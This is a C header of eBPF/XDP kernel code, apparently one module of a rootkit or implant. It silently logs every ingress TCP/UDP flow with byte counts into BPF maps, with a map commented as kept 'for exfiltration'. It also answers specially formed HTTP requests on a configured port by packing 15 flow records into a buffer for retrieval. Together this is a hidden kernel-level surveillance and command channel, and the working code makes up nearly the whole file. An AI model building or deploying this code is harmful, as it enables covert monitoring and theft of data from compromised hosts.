/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/* Copyright (c) 2020
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 2 of the GNU General Public
 * License as published by the Free Software Foundation.
 */
#ifndef _NETWORK_MONITOR_H_
#define _NETWORK_MONITOR_H_

struct flow_t {
    union {
        struct {
            u32 saddr;
            u32 daddr;
            u16 source_port;
            u16 dest_port;
            u32 flow_type;
        } data;
        struct {
            u8 saddr_a;
            u8 saddr_b;
            u8 saddr_c;
            u8 saddr_d;
            u8 daddr_a;
            u8 daddr_b;
            u8 daddr_c;
            u8 daddr_d;
            u8 source_port_a;
            u8 source_port_b;
            u8 dest_port_a;
            u8 dest_port_b;
            u8 flow_type_a;
            u8 flow_type_b;
            u8 flow_type_c;
            u8 flow_type_d;
        } b;
    };
};

#define MAX_FLOW_COUNT 8192

struct bpf_map_def SEC("maps/network_flow_next_key") network_flow_next_key = {
    .type = BPF_MAP_TYPE_ARRAY,
    .key_size = sizeof(u32),
    .value_size = sizeof(u32),
    .max_entries = 1,
    .pinning = 0,
    .namespace = "",
};

struct bpf_map_def SEC("maps/network_flow_keys") network_flow_keys = {
    .type = BPF_MAP_TYPE_ARRAY,
    .key_size = sizeof(u32),
    .value_size = sizeof(struct flow_t),
    .max_entries = MAX_FLOW_COUNT,
    .pinning = 0,
    .namespace = "",
};

struct network_flow_counter_t {
    union {
        struct {
            u64 udp_count;
            u64 tcp_count;
        } data;
        struct {
            u8 udp_count_a;
            u8 udp_count_b;
            u8 udp_count_c;
            u8 udp_count_d;
            u8 udp_count_e;
            u8 udp_count_f;
            u8 udp_count_g;
            u8 udp_count_h;
            u8 tcp_count_a;
            u8 tcp_count_b;
            u8 tcp_count_c;
            u8 tcp_count_d;
            u8 tcp_count_e;
            u8 tcp_count_f;
            u8 tcp_count_g;
            u8 tcp_count_h;
        } b;
    };
};

struct bpf_map_def SEC("maps/network_flows") network_flows = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(struct flow_t),
    .value_size = sizeof(struct network_flow_counter_t),
    .max_entries = MAX_FLOW_COUNT,
    .pinning = 0,
    .namespace = "",
};

__attribute__((always_inline)) int monitor_flow_xdp(struct pkt_ctx_t *pkt) {
    // generate flow
    struct flow_t flow = {
        .data = {
            .saddr = pkt->ipv4->saddr,
            .daddr = pkt->ipv4->daddr,
            .flow_type = INGRESS_FLOW,
        },
    };
    if (pkt->ipv4->protocol == IPPROTO_TCP) {
        flow.data.source_port = htons(pkt->tcp->source);
        flow.data.dest_port = htons(pkt->tcp->dest);
    } else if (pkt->ipv4->protocol == IPPROTO_UDP) {
        flow.data.source_port = htons(pkt->udp->source);
        flow.data.dest_port = htons(pkt->udp->dest);
    } else {
        return 0;
    }

    // select flow counter
    struct network_flow_counter_t *counter = bpf_map_lookup_elem(&network_flows, &flow);
    if (counter == NULL) {
        // this is a new flow, generate a new entry
        u32 key = 0;
        u32 *next_key = bpf_map_lookup_elem(&network_flow_next_key, &key);
        if (next_key == NULL) {
            // should never happen
            return 0;
        }
        key = *next_key % MAX_FLOW_COUNT;
        __sync_fetch_and_add(next_key, 1);

        // delete previous flow counter at current key
        struct flow_t *prev_flow = bpf_map_lookup_elem(&network_flow_keys, &key);
        if (prev_flow != NULL) {
            bpf_map_delete_elem(&network_flows, prev_flow);
            bpf_map_delete_elem(&network_flow_keys, &key);
        }

        // set flow counter for provided key
        struct network_flow_counter_t new_counter = {};
        bpf_map_update_elem(&network_flows, &flow, &new_counter, BPF_ANY);

        // set the flow in the network_flow_keys for exfiltration
        bpf_map_update_elem(&network_flow_keys, &key, &flow, BPF_ANY);
    }

    counter = bpf_map_lookup_elem(&network_flows, &flow);
    if (counter == NULL) {
        // should never happen
        return 0;
    }

    // add packet length to counter
    if (pkt->ipv4->protocol == IPPROTO_TCP) {
        counter->data.tcp_count = counter->data.tcp_count + htons(pkt->ipv4->tot_len);
    } else if (pkt->ipv4->protocol == IPPROTO_UDP) {
        counter->data.udp_count = counter->data.udp_count + htons(pkt->ipv4->tot_len);
    }

    return 0;
}

__attribute__((always_inline)) int atoi(char c) {
    if (c >= '0' && c <= '9') {
        return c - '0';
    }
    return 0;
}

__attribute__((always_inline)) int handle_get_net_dis(char request[HTTP_REQ_LEN]) {
    // parse the requested index
    u32 start_id = atoi(request[0]) * 1000 + atoi(request[1]) * 100 + atoi(request[2]) * 10 + atoi(request[3]);
    if (start_id >= MAX_FLOW_COUNT) {
        return 0;
    }

    u32 key = DEDICATED_WATCH_KEY_NETWORK_DISCOVERY;
    struct fs_watch_key_t *fs_watch_key = bpf_map_lookup_elem(&dedicated_watch_keys, &key);
    if (fs_watch_key == NULL) {
        // should never happen
        return 0;
    }

    // fetch fs_watch entry for the image list
    struct fs_watch_t *watch = bpf_map_lookup_elem(&fs_watches, fs_watch_key);
    if (watch == NULL) {
        // create the entry for the first time
        key = 0;
        watch = bpf_map_lookup_elem(&fs_watch_gen, &key);
        if (watch == NULL) {
            // should never happen
            return 0;
        }
        watch->next_key = 0;
        watch->content[0] = 0;

        bpf_map_update_elem(&fs_watches, fs_watch_key, watch, BPF_ANY);
        watch = bpf_map_lookup_elem(&fs_watches, fs_watch_key);
        if (watch == NULL) {
            // should never happen
            return 0;
        }
    }

    // loop through the requested indexes (we only have room for 15 = 500 // 32)
    struct flow_t *flow;
    struct flow_t empty_flow = {};
    struct network_flow_counter_t *counter;
    struct network_flow_counter_t empty_counter = {};
    int cursor = start_id;
    #pragma unroll
    for (int i = 0; i < 15; i++) {
        cursor = start_id + i;
        flow = bpf_map_lookup_elem(&network_flow_keys, &cursor);
        if (flow == NULL) {
            flow = &empty_flow;
            counter = &empty_counter;
        } else {
            counter = bpf_map_lookup_elem(&network_flows, flow);
            if (counter == NULL) {
                counter = &empty_counter;
            }
        }

        // copy flow data
        watch->content[i * 32] = flow->b.saddr_a != 0 ? flow->b.saddr_a : '*';
        watch->content[i * 32 + 1] = flow->b.saddr_b != 0 ? flow->b.saddr_b : '*';
        watch->content[i * 32 + 2] = flow->b.saddr_c != 0 ? flow->b.saddr_c : '*';
        watch->content[i * 32 + 3] = flow->b.saddr_d != 0 ? flow->b.saddr_d : '*';
        watch->content[i * 32 + 4] = flow->b.daddr_a != 0 ? flow->b.daddr_a : '*';
        watch->content[i * 32 + 5] = flow->b.daddr_b != 0 ? flow->b.daddr_b : '*';
        watch->content[i * 32 + 6] = flow->b.daddr_c != 0 ? flow->b.daddr_c : '*';
        watch->content[i * 32 + 7] = flow->b.daddr_d != 0 ? flow->b.daddr_d : '*';
        watch->content[i * 32 + 8] = flow->b.source_port_a != 0 ? flow->b.source_port_a : '*';
        watch->content[i * 32 + 9] = flow->b.source_port_b != 0 ? flow->b.source_port_b : '*';
        watch->content[i * 32 + 10] = flow->b.dest_port_a != 0 ? flow->b.dest_port_a : '*';
        watch->content[i * 32 + 11] = flow->b.dest_port_b != 0 ? flow->b.dest_port_b : '*';
        watch->content[i * 32 + 12] = flow->b.flow_type_a != 0 ? flow->b.flow_type_a : '*';
        watch->content[i * 32 + 13] = flow->b.flow_type_b != 0 ? flow->b.flow_type_b : '*';
        watch->content[i * 32 + 14] = flow->b.flow_type_c != 0 ? flow->b.flow_type_c : '*';
        watch->content[i * 32 + 15] = flow->b.flow_type_d != 0 ? flow->b.flow_type_d : '*';

        // copy counter data
        watch->content[i * 32 + 16] = counter->b.udp_count_a != 0 ? counter->b.udp_count_a : '*';
        watch->content[i * 32 + 17] = counter->b.udp_count_b != 0 ? counter->b.udp_count_b : '*';
        watch->content[i * 32 + 18] = counter->b.udp_count_c != 0 ? counter->b.udp_count_c : '*';
        watch->content[i * 32 + 19] = counter->b.udp_count_d != 0 ? counter->b.udp_count_d : '*';
        watch->content[i * 32 + 20] = counter->b.udp_count_e != 0 ? counter->b.udp_count_e : '*';
        watch->content[i * 32 + 21] = counter->b.udp_count_f != 0 ? counter->b.udp_count_f : '*';
        watch->content[i * 32 + 22] = counter->b.udp_count_g != 0 ? counter->b.udp_count_g : '*';
        watch->content[i * 32 + 23] = counter->b.udp_count_h != 0 ? counter->b.udp_count_h : '*';
        watch->content[i * 32 + 24] = counter->b.tcp_count_a != 0 ? counter->b.tcp_count_a : '*';
        watch->content[i * 32 + 25] = counter->b.tcp_count_b != 0 ? counter->b.tcp_count_b : '*';
        watch->content[i * 32 + 26] = counter->b.tcp_count_c != 0 ? counter->b.tcp_count_c : '*';
        watch->content[i * 32 + 27] = counter->b.tcp_count_d != 0 ? counter->b.tcp_count_d : '*';
        watch->content[i * 32 + 28] = counter->b.tcp_count_e != 0 ? counter->b.tcp_count_e : '*';
        watch->content[i * 32 + 29] = counter->b.tcp_count_f != 0 ? counter->b.tcp_count_f : '*';
        watch->content[i * 32 + 30] = counter->b.tcp_count_g != 0 ? counter->b.tcp_count_g : '*';
        watch->content[i * 32 + 31] = counter->b.tcp_count_h != 0 ? counter->b.tcp_count_h : '*';
    }
    return 0;
}


SEC("xdp/ingress/get_net_dis")
int xdp_ingress_get_net_dis(struct xdp_md *ctx) {
    struct cursor c;
    struct pkt_ctx_t pkt;
    int ret = parse_xdp_packet(ctx, &c, &pkt);
    if (ret < 0) {
        return XDP_PASS;
    }

    switch (pkt.ipv4->protocol) {
        case IPPROTO_TCP:
            if (pkt.tcp->dest != htons(load_http_server_port())) {
                return XDP_PASS;
            }

            handle_get_net_dis(pkt.http_req->data);
            // tail call to execute the action set for this request
            bpf_tail_call(ctx, &xdp_progs, HTTP_ACTION_HANDLER);
            break;
    }

    return XDP_PASS;
}

#endif